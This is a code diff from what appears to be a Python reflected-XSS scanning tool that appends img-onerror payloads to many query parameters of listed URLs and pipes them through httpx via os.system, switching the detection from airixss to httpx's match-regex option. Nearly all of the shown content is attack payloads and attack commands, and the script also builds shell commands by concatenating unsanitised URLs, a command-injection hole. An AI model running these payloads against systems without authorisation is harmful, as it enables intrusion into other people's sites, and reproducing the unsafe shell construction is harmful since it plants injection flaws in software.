@@ -26,10 +26,10 @@ with open(args.lista, 'r') as f:
 
         payload_xss_4 = "?page=%27%22><img src=x onerror=alert(1)>&view=%27%22><img src=x onerror=alert(1)>&section=%27%22><img src=x onerror=alert(1)>&module=%27%22><img src=x onerror=alert(1)>&component=%27%22><img src=x onerror=alert(1)>&task=%27%22><img src=x onerror=alert(1)>&action=%27%22><img src=x onerror=alert(1)>&option=%27%22><img src=x onerror=alert(1)>&format=%27%22><img src=x onerror=alert(1)>&tmpl=%27%22><img src=x onerror=alert(1)>&layout=%27%22><img src=x onerror=alert(1)>&lang=%27%22><img src=x onerror=alert(1)>&language=%27%22><img src=x onerror=alert(1)>&charset=%27%22><img src=x onerror=alert(1)>&stylesheet=%27%22><img src=x onerror=alert(1)>&script=%27%22><img src=x onerror=alert(1)>&js=%27%22><img src=x onerror=alert(1)>"
 
-        execucao_xss_1 = "echo '"+url+""+payload_xss_1+"'|httpx -silent -mc 200|airixss -payload '=alert(1)>'|grep -Ev 'Not'"
-        execucao_xss_2 = "echo '"+url+""+payload_xss_2+"'|httpx -silent -mc 200|airixss -payload '=alert(1)>'|grep -Ev 'Not'"
-        execucao_xss_3 = "echo '"+url+""+payload_xss_3+"'|httpx -silent -mc 200|airixss -payload '=alert(1)>'|grep -Ev 'Not'"
-        execucao_xss_4 = "echo '"+url+""+payload_xss_4+"'|httpx -silent -mc 200|airixss -payload '=alert(1)>'|grep -Ev 'Not'"
+        execucao_xss_1 = "echo '"+url+""+payload_xss_1+"'|httpx -mc 200 -mr '=alert(1)>'"
+        execucao_xss_2 = "echo '"+url+""+payload_xss_2+"'|httpx -mc 200 -mr '=alert(1)>'"
+        execucao_xss_3 = "echo '"+url+""+payload_xss_3+"'|httpx -mc 200 -mr '=alert(1)>'"
+        execucao_xss_4 = "echo '"+url+""+payload_xss_4+"'|httpx -mc 200 -mr '=alert(1)>'"
 
         os.system(execucao_xss_1)
         os.system(execucao_xss_2)
